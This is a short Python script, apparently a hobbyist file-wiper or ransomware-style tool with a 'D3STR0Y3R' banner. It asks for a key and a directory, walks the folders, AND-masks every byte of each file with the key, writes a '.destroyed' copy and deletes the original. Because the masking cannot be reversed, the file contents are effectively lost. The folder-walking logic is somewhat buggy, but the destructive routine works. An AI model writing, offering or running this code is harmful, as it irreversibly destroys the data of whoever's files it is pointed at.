import os


class destroyer:
    def __init__(self, key, FolderPath):
        self.__key = key
        # sets # 
        self.__files = set()
        self.__folders = set()
        self.__other_folders = set()
        # sets #
        self.__folder_path = FolderPath
    
    def __List_FaF(self):
        for i in os.listdir():
            if os.path.isdir(os.path.abspath(i)):
                self.__folders.add(os.path.abspath(i))
            else:
                self.__files.add(os.path.abspath(i))

    def terminate_it(self, file_name):
        with open(file_name, "rb") as of:
            s = of.read()
        l = []
        for i in s:
            l.append(ord(chr((i&ord(self.__key)))))
        with open(file_name+".destroyed" ,"wb") as of:
            for i in l:
                of.write(bytes(chr(i).encode("utf8")))
        l.clear()
        os.remove(file_name)

    def Process(self):
        os.chdir(str(self.__folder_path))
        self.__List_FaF()
        while len(self.__folders) != 0:
            self.__List_FaF()
            for f in self.__folders:
                os.chdir(f)
                self.__other_folders.add(f)
                self.__List_FaF()
                break
            self.__folders.remove(f)
        for x in self.__files:
            self.terminate_it(x)
print(""" ______   ______   _______ _________ _______  _______           ______   _______ 
(  __  \ / ___  \ (  ____ \\__   __/(  ____ )(  __   )|\     /|/ ___  \ (  ____ )
| (  \  )\/   \  \| (    \/   ) (   | (    )|| (  )  |( \   / )\/   \  \| (    )|
| |   ) |   ___) /| (_____    | |   | (____)|| | /   | \ (_) /    ___) /| (____)|
| |   | |  (___ ( (_____  )   | |   |     __)| (/ /) |  \   /    (___ ( |     __)
| |   ) |      ) \      ) |   | |   | (\ (   |   / | |   ) (         ) \| (\ (   
| (__/  )/\___/  //\____) |   | |   | ) \ \__|  (__) |   | |   /\___/  /| ) \ \__
(______/ \______/ \_______)   )_(   |/   \__/(_______)   \_/   \______/ |/   \__/
                                                                                 """)
d = destroyer(input("Key: "), input("Directory [xyz/]: "))
d.Process()
